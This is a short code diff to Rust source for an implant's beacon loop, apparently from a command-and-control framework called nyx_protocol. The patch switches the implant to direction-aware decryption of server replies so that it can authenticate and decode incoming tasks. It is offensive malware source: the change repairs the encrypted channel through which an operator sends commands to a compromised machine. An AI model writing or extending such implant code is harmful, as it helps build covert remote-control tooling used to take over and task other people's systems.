@@ -14,8 +14,8 @@
 
 use crate::heap::{vec, String, Vec};
 use nyx_protocol::{
-    encode_frame, open_frame, parse_frame, wire::Writer, Command, ImplantKeypair, Response,
-    SessionInfo, Task, TaskResponse,
+    encode_frame, open_frame_dir, parse_frame, wire::Writer, Command, Direction, ImplantKeypair,
+    Response, SessionInfo, Task, TaskResponse,
 };
 
 /// Build config baked into the implant at build time (per-build encrypted config
@@ -86,7 +86,9 @@ pub unsafe fn beacon_loop() {
         };
 
         let Ok(raw) = parse_frame(&body) else { continue };
-        let Ok(plaintext) = open_frame(&key, &raw) else { continue };
+        // Server replies are sealed with Direction::ServerToClient; open with
+        // the matching direction or the AEAD tag check fails.
+        let Ok(plaintext) = open_frame_dir(&key, Direction::ServerToClient, &raw) else { continue };
         let Ok(tasks) = Task::decode_vec(&plaintext) else { continue };
 
         for t in tasks {
